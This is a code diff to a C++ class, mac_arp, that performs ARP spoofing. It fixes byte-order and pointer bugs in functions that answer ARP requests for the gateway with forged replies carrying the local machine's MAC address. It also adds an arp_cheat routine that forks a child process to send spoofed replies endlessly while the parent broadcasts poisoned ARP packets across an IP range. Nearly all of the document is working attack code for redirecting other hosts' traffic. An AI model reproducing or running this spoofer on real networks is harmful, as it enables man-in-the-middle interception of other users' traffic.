@@ -52,7 +52,7 @@ int mac_arp::send_arp ( my_mac * mac, my_arp*arp, int flag ) {
         perror ( "send error!" );
         return -1;
     }
-    printf ( "send data:%d Bytes\n", ret_len );
+    //printf ( "send data:%d Bytes\n", ret_len );
     return ret_len;
 }
 
@@ -85,7 +85,7 @@ int mac_arp::arp_cheat_send(uint32_t start, uint32_t endad ) {//net sequence
     if (start != 0) {
         st = htonl( start);
     } else {
-        st =htonl( local_ipstart());
+        st = htonl( local_ipstart());
     }
     if (endad != 0) {
         ed = htonl( endad);
@@ -114,12 +114,12 @@ int mac_arp::arp_cheat_send(uint32_t ip) {
     return send_arp(&mac, &arp);
 }
 
-uint32_t mac_arp::arp_cheat_recv(char *start , char *endsss ) {
-    uint32_t st=local_ipstart(),ed=local_ipend();
-    if(start!=NULL) st=inet_addr(start);
-    if(endsss!=NULL) ed=inet_addr(endsss);
+uint32_t mac_arp::arp_cheat_recv(char *start, char *endsss ) {
+    uint32_t st = local_ipstart(), ed = local_ipend();
+    if(start != NULL) st = inet_addr(start);
+    if(endsss != NULL) ed = inet_addr(endsss);
 
-    arp_cheat_recv(st, ed);
+    return arp_cheat_recv(st, ed);
 }
 
 uint32_t mac_arp::arp_cheat_recv(uint32_t start, uint32_t endd) { //net sequence
@@ -128,19 +128,24 @@ uint32_t mac_arp::arp_cheat_recv(uint32_t start, uint32_t endd) { //net sequence
 
     if (recv_arp(&mac, &arp) <= 0) return -1;
 
-    if (arp.op_type == 1 && arp.des_ip == local[local_conf_valid - 1].gate) {
-        uint32_t tp = htonl(arp.des_ip);
+    //printf("\nrecv a arp!\n");
+    //show_mac(&mac);
+    //show_arp(&arp);
+    if (htons(arp.op_type) == 1 && arp.des_ip == local[local_conf_valid - 1].gate) {
+        uint32_t tp = htonl(arp.src_ip);
+
         if (tp <= htonl(endd) && tp >= htonl(start)) {
             my_swap_buffer((char *)mac.des, (char *)mac.src, mac_len);
             form_machd(&mac);
+            arp.op_type = htons(2);
 
-            arp.op_type=htons(2);
-            my_swap_buffer((char *)arp.des_ip, (char *)arp.src_ip, sizeof(arp.des_ip));
+            my_swap_buffer((char *)&arp.des_ip, (char *)&arp.src_ip, sizeof(arp.des_ip));
+            //printf("get in once!%s\n",inet_ntoa(i2addr_in(tp)));
             my_swap_buffer((char *)arp.des_mac, (char *)arp.src_mac, sizeof(arp.des_mac));
-            memcpy(arp.src_mac, local[local_conf_valid-1].mac, sizeof(arp.src_mac));
+            memcpy(arp.src_mac, local[local_conf_valid - 1].mac, sizeof(arp.src_mac));
 
-            send_arp(&mac, &arp);
-            printf("cheate answer: %s\n", inet_ntoa(i2addr_in(arp.src_ip)));
+            int tttp=send_arp(&mac, &arp);
+            //printf("send %d Bytest, cheate answer: %s!!!!!!!!!!!!!!!!!!!!!!!!!\n",tttp, inet_ntoa(i2addr_in(arp.des_ip)));
         }
         return arp.src_ip;
     }
@@ -151,12 +156,38 @@ uint32_t mac_arp::arp_cheat_recv(uint32_t ip) { //net sequence
     return arp_cheat_recv(ip, ip);
 }
 
-void mac_arp::show_arp ( my_arp *arp ) {
-    if(arp->op_type == 1) printf("arp request(1)\n");
-    else if (arp->op_type == 2) printf("arp response(2)\n");
+uint32_t mac_arp::arp_cheat(uint32_t start, uint32_t endd) { //net sequence
+    pid_t fpid = fork();
+    if (fpid < 0)
+        perror("error in fork!");
+    else if (fpid == 0) {//child
+            while(1) {
+                    arp_cheat_recv(start, endd);
+            }
+    }
+    arp_cheat_send(start, endd);
+    int status;
+    wait(&status);
+}
 
-    printf ( "src ip:%s\n", inet_ntoa (   * ( ( struct in_addr* ) & ( arp->src_ip ) )  ) );
-    printf ( "des ip:%s\n", inet_ntoa (  * ( ( struct in_addr* ) & ( arp->des_ip ) )  ) );
+uint32_t mac_arp::arp_cheat(char *start, char *endsss){
+    uint32_t st = local_ipstart(), ed = local_ipend();
+    if(start != NULL) st = inet_addr(start);
+    if(endsss != NULL) ed = inet_addr(endsss);
+
+    return arp_cheat(st, ed);
+}
+
+uint32_t mac_arp::arp_cheat(uint32_t ip){//net sequence
+return arp_cheat(ip, ip);
+}
+
+void mac_arp::show_arp ( my_arp * arp ) {
+    if(htons(arp->op_type) == 1) printf("\narp request(1)\n");
+    else if (htons(arp->op_type )== 2) printf("\narp response(2)\n");
+
+    printf ( "src ip in packet:%s\n", inet_ntoa (   * ( ( struct in_addr* ) & ( arp->src_ip ) )  ) );
+    printf ( "des ip in packet:%s\n", inet_ntoa (  * ( ( struct in_addr* ) & ( arp->des_ip ) )  ) );
     printf ( "src mac in packet:%02x:%02x:%02x:%02x:%02x:%02x\n", arp->src_mac[0], arp->src_mac[1], arp->src_mac[2], arp->src_mac[3], arp->src_mac[4], arp->src_mac[5] );
     printf ( "des mac in packet:%02x:%02x:%02x:%02x:%02x:%02x\n", arp->des_mac[0], arp->des_mac[1], arp->des_mac[2], arp->des_mac[3], arp->des_mac[4], arp->des_mac[5] );
 }
